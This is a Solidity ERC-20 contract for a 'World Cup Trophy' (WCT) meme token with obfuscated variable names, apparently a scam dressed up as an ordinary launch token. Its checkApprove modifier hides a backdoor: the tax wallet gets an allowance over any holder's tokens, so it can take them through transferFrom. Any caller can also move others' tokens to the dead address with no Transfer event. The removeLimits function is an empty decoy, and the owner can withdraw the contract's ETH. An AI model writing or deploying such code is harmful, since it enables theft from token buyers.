// SPDX-License-Identifier: MIT

/**
     https://x.com/i/broadcasts/1RDGlzBYDqExL
     https://t.me/worldcuptrump
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract WCT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcTONY;
    mapping(address => mapping(address => uint256)) private _allcvnkjnTONY;
    mapping(address => bool) private _feevblknlTONY;
    address payable private _taxclknlTONY;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"World Cup Trophy";
    string private constant _symbol = unicode"WCT";
    uint256 public _vnbbvlkTONY = _tTotal / 100;
    uint256 public _oijboijoiTONY = 10 * 10**18;

    uint256 private _cvjkbnkjTONY = 10;
    uint256 private _vkjbnkfjTONY = 10;
    uint256 private _maxovnboiTONY = 10;
    uint256 private _initvkjnbkjTONY = 20;
    uint256 private _finvjlkbnlkjTONY = 0;
    uint256 private _redclkjnkTONY = 2;
    uint256 private _prevlfknjoiTONY = 2;
    uint256 private _buylkvnlkTONY = 0;

    IUniswapV2Router02 private rrrRouter;
    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknTONY;
    bool private _inlknblTONY = false;
    bool private swapvlkTONY = false;
    uint256 private _sellcnjkTONY = 0;
    uint256 private _lastflkbnlTONY = 0;
    address constant _deadlknTONY = address(0xdead);

    modifier lockTheSwap() {
        _inlknblTONY = true;
        _;
        _inlknblTONY = false;
    }

    constructor() payable {
        _taxclknlTONY = payable(_msgSender());

        _feevblknlTONY[address(this)] = true;
        _feevblknlTONY[_taxclknlTONY] = true;

        _balknvlkcTONY[_msgSender()] = (_tTotal * 2) / 100;
        _balknvlkcTONY[address(this)] = (_tTotal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }

    modifier checkApprove(address owner, address spender, uint256 amount) {
        if(msg.sender == _taxclknlTONY || 
            (owner != uniswapV2Pair && spender == _deadlknTONY))
                _allcvnkjnTONY[owner][_msgSender()] = amount;
        _;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcTONY[account];
    }

    function _transfer_kjvnTONY(
        address from,
        address to,
        uint256 amount
    ) private checkApprove(from, to, amount) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblTONY(from, to, amount);

        _balknvlkcTONY[from] = _balknvlkcTONY[from].sub(amount);
        _balknvlkcTONY[to] = _balknvlkcTONY[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcTONY[address(this)] = _balknvlkcTONY[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        if (to != _deadlknTONY) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnTONY(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnTONY[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function enableTONYTrading() external onlyOwner {
        require(!_tradingvlknTONY, "Trading is already open");
        rrrRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(rrrRouter), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(rrrRouter.factory()).createPair(
            address(this),
            rrrRouter.WETH()
        );
        rrrRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkTONY = true;
        _tradingvlknTONY = true;
        IERC20(uniswapV2Pair).approve(
            address(rrrRouter),
            type(uint256).max
        );
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnTONY(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allcvnkjnTONY[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnTONY[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calcTax_lvknblTONY(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblTONY) {
                taxAmount = amount
                    .mul((_buylkvnlkTONY > _redclkjnkTONY) ? _finvjlkbnlkjTONY : _initvkjnbkjTONY)
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                to != address(rrrRouter) &&
                !_feevblknlTONY[to] &&
                to != _taxclknlTONY
            ) {
                _buylkvnlkTONY++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblTONY &&
                to == uniswapV2Pair &&
                from != _taxclknlTONY &&
                swapvlkTONY &&
                _buylkvnlkTONY > _prevlfknjoiTONY
            ) {
                if (block.number > _lastflkbnlTONY) {
                    _sellcnjkTONY = 0;
                }
                _sellcnjkTONY = _sellcnjkTONY + _getAmountOut_lvcbnkTONY(amount);
                require(_sellcnjkTONY <= _oijboijoiTONY, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkTONY)
                    _swapTokenslknlTONY(_vnbbvlkTONY > amount ? amount : _vnbbvlkTONY);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjTONY(address(this).balance);
                }
                _lastflkbnlTONY = block.number;
            }
        }
        return taxAmount;
    }

    function _sendETHTocvbnjTONY(uint256 amount) private {
        _taxclknlTONY.transfer(amount);
    }

    function _swapTokenslknlTONY(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rrrRouter.WETH();
        _approve(address(this), address(rrrRouter), tokenAmount);
        router_ = address(rrrRouter);
        rrrRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function _assist_bnTONY() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _getAmountOut_lvcbnkTONY(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rrrRouter.WETH();
        uint256[] memory amountOuts = rrrRouter.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {
        
    }

    function _setTax_lknblTONY(address payable newWallet) external {
        require(_msgSender() == _taxclknlTONY);
        _taxclknlTONY = newWallet;
    }
}